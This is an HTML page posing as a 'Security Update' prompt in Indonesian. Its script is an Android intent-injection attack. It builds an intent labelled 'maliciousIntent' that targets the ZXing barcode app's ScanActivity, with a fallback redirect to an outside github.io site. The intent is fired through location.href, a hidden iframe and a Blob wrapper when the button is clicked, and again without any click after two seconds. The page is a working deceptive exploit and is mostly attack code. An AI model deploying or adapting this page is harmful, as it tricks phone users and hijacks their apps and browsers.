<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; flex-direction: column;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 400px; width: 100%;
  }
  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; margin-bottom: 20px; font-size: 14px; }
  button {
    background: #007aff; color: #fff; padding: 15px 30px;
    border-radius: 8px; font-size: 18px; font-weight: bold;
    cursor: pointer; border: none; width: 100%;
  }
  button:hover { background: #005bb5; }
  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 400px;
    height: 120px; overflow-y: auto; text-align: left;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Update</h1>
  <p>Klik tombol di bawah untuk memperbarui sistem.</p>
  <button id="intentBtn">Install Update</button>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. KONFIGURASI PAYLOAD (INTENT INJECTION)
  // ============================================
  // URL Fallback: Jika aplikasi ZXing tidak terinstal, 
  // Chrome akan mencoba membuka URL ini.
  var zombieStreamUrl = "https://artha231.github.io/";
  
  // Encode URL fallback dengan benar (perbaikan typo)
  var encodedFallback = encodeURIComponent(zombieStreamUrl);

  // Intent yang dimodifikasi
  // Catatan: Format Intent URI di Android harus tepat agar valid.
  var maliciousIntent = "intent://scan/#Intent;" +
                        "scheme=zxing;" +
                        "package=com.google.zxing.client.android;" +
                        "S.browser_fallback_url=" + encodedFallback + ";" +
                        "SEL.component=com.google.zxing.client.android/.ScanActivity;" +
                        "end";

  console.log("Malicious Intent: " + maliciousIntent);

  // ============================================
  // 2. EKSEKUSI (Clickjacking / One Click)
  // ============================================
  document.getElementById('intentBtn').addEventListener('click', function() {
    log("[!] Memicu Intent Redirection (Component + Fallback)...");
    
    // Trik 1: Location.href (Langsung)
    try {
      window.location.href = maliciousIntent;
      log("[+] Intent dieksekusi via location.href.");
    } catch(e) {
      log("[-] Gagal: " + e.message);
    }

    // Trik 2: Iframe tersembunyi (Fallback Redirect)
    setTimeout(function() {
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = maliciousIntent;
      document.body.appendChild(iframe);
      log("[+] Intent via Iframe dicoba.");
    }, 500);

    // Trik 3: Blob Wrapper
    setTimeout(function() {
      try {
        var blobPayload = `<script>window.location.href = "${maliciousIntent}";<\/script>`;
        var blob = new Blob([blobPayload], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        window.location.replace(url);
        log("[+] Intent via Blob dicoba.");
      } catch(e) {}
    }, 1000);
  });

  // ============================================
  // 3. ZERO-CLICK ATTEMPT
  // ============================================
  setTimeout(function() {
    log("[Zero-Click] Mencoba Intent tanpa klik...");
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = maliciousIntent;
    document.body.appendChild(iframe);
  }, 2000);

})();
</script>
</body>
</html>
